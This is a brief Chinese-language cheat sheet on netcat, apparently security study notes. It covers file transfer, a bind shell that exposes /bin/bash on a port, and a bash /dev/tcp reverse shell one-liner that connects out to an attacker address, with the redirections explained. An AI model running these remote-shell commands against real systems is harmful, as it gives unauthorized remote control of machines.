---
title: 常用命令
---

# nc

## 传文件

```shell
写: >
读: <

方式一: 
192.168.1.1				  					192.168.1.2
nc - lvp 9999 > /test.txt     nc 192.168.1.1 9999 < /opt/test.txt

方式二: 
192.168.1.191                 192.168.1.2
nc -lvp 9999 < /test.txt	 		nc 192.168.1.1 9999 > /opt/test.txt
```

## 正向shell

> 反弹机开启监听，反弹机去连接

```shell
1.使用NC工具在目标机器开启端口进行监听，并将本地的bash发布出去。
nc -lvvp 9999 -e /bin/bash
2.攻击端直接访问目标机器
nc 192.168.122.6 9999
```

## 反弹shell

> 反弹机监听端口，靶机自己连接

```shell
反弹机：nc -lvp 9999
靶机：/bin/bash -i >& /dev/tcp/192.168.1.1/9999 0>&1
# bash -i: 代表在本地打开一个bash

# /dev/tcp/ip/port: /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接

# >&后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出，这个时候我们在本机CentOS输入命令，输出以及错误输出的内容就会被传递显示到远程。

# 命令后面加上0>&1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了

# 命令后面加上0>&2也是可以的，代表将标准输入重定向到标准错误输出，而标准错误输出重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程